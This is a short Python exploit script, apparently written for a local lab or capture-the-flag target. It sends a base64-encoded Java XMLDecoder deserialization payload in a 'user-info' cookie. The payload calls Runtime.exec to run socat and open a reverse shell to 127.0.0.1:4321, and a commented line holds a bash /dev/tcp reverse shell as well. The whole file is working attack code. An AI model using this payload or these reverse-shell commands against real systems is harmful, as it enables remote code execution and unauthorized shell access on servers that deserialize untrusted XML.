import requests
import base64


URL: str = "http://localhost:8888/"


PAYLOAD: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>socat</string>
    </void>
    <void index="1">
     <string>tcp-connect:127.0.0.1:4321</string>
    </void>
    <void index="2">
     <string>exec:/bin/bash,pty,stderr,setsid,sigint,sane</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""

#bash -i >& /dev/tcp/127.0.0.1/1234 0>&1

##### COMPRIMO EL SRC ######
PAYLOAD = PAYLOAD.strip()

encoded_payload = base64.b64encode(PAYLOAD.encode()).decode()

response = requests.get(URL, cookies={
    'user-info': encoded_payload
})

print("Response Status Code:", response.status_code)
print("Response Text:", response.text)














